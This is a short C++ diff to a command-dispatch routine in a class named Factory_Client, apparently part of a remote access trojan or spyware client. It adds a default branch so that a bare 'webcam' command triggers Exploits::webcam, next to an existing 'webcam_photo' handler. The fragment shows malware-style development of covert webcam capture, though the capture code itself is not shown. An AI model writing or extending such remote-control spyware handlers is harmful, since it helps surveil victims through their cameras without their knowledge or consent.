@@ -111,6 +111,10 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Exploits::webcam(client, args[1]);
 	}
+	else if (args[0] == "webcam" && args.size() == 1)
+	{
+		Exploits::webcam(client, "1");
+	}
 	else if (args[0] == "webcam_photo" && args.size() == 1)
 	{
 		Exploits::webcam_photo(client);
